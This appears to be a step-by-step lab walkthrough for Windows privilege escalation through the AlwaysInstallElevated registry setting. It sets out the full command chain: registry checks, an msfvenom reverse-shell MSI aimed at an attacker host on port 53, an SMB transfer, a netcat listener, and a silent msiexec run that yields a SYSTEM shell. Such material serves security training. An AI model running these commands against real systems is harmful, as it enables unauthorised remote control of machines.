# 🐾 Task 8: Registry - AlwaysInstallElevated
---

## 📜 Task Description
In this task, we will explore a vulnerability associated with the `AlwaysInstallElevated` registry key. This key allows installers to run with SYSTEM privileges, even when executed by a low-privilege user. We will leverage this to gain a reverse shell with SYSTEM privileges using the Windows Installer.

---

## 🔍 Step 1: Checking the Registry Keys
First, check if the `AlwaysInstallElevated` registry values are set. Execute the following commands:  
`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`  
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

### 📋 Expected Output
- Confirm that both keys are set to `1` (0x1), which enables installers to run with SYSTEM privileges.

## 🔑 Step 2: Generating a Reverse Shell Using msfvenom
Now, use `msfvenom` on Kali to create an `.msi` installer file with a reverse shell payload. Execute the following command:  
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`

### 📋 Expected Output
- Confirm that the `reverse.msi` file has been successfully created.

---

## 📝 Step 3: Transferring the File to Windows
Transfer the `reverse.msi` file to the target Windows machine in the `C:\PrivEsc` directory. Use an SMB server for the transfer:

1. Start an SMB server on Kali (if not already running).
2. Copy the file from Kali to Windows:  
   `copy \\LHOST\kali\reverse.msi C:\PrivEsc\reverse.msi`

### 📋 Expected Output
- Confirm that the file has been successfully transferred to `C:\PrivEsc`.

---

## 🎧 Step 4: Setting Up the Listener
Before executing the installer, ensure you have a listener running on Kali. Start the listener using the following command:  
`nc -lvnp 53`

---

## 🚀 Step 5: Running the Installer
Now, execute the `reverse.msi` installer, which will trigger the reverse shell with SYSTEM privileges. Run the following command on the target Windows machine:  
`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

### 📋 Expected Output
- Confirm that you have received a reverse shell with SYSTEM privileges on Kali.
